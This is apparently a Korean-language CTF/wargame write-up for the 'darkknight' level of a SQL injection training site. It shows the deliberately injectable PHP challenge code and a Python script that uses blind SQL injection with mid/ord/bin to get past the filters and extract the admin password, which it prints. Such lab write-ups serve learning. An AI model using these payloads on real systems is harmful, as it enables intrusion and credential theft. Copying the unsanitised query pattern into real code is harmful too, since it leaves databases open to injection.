---
title : "LOS Lv.12 darkknight"
categories : [Wargame, rubiya]
---


## darkknight 
```php
query : select id from prob_darkknight where id='guest' and pw='' and no=

<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

## Solution
```
no 입력값에는 . , 괄호(), ' , substr, ascii, = 사용 불가
pw 입력값에는 ' 사용 불가함.

비밀번호 길이는 8

substr, ascii는 mid, ord 함수로 대체하면 됨. 
```
```python
import requests

url='https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'PHPSESSID':'[redacted]'}

bit_val=''
pw=''

for i in range(1,9) :
    payload={'pw':'1', 'no':'1 or id like "admin" and length(bin(ord(mid(pw,'+str(i)+',1)))) like 7 #'}
    res=requests.get(url,headers=headers, params=payload, cookies=cookies)
    if "Hello admin" in res.text :
        bit_len=7
    else :
        bit_len=6

    for j in range(1,bit_len+1) :
        payload={'pw':'1','no':'1 or id like "admin" and mid(bin(ord(mid(pw,'+str(i)+',1))),'+str(j)+',1) like 0 #'}
        res=requests.get(url,headers=headers, params=payload, cookies=cookies)
        if "Hello admin" in res.text :
            bit_val+='0'
        else :
            bit_val+='1'
    
    pw+=chr(int(bit_val,2))
    bit_val=''
    print("pw :",pw) # 0b70ea1f
```
